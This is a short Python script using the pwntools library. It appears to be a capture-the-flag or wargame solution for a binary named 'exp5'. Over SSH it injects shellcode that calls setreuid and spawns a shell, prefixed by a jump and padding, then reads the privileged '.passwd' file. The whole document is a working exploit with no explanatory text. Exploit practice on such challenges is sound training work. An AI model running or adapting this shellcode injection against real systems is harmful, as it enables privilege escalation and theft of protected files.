#!/usr/bin/env python3
import pwn
import os

pwn.context.clear(arch='amd64')
file = './exp5' 
s = pwn.ssh('login',
            'host',
            password='password',
            port=12345)

if not os.path.isfile(file):
    s.download(file)

### setreuid + /bin/sh shellcode
SHELL_CODE = pwn.asm(pwn.shellcraft.amd64.linux.setreuid(1155))
SHELL_CODE += pwn.asm(pwn.shellcraft.amd64.linux.sh())

p = s.process(file)
print(p.recvline())

payload = b'\xeb\x07'
payload += b'A'*7
payload += SHELL_CODE

p.sendline(payload)
p.sendline(b'cat .passwd')
print(p.recvline())
p.close()

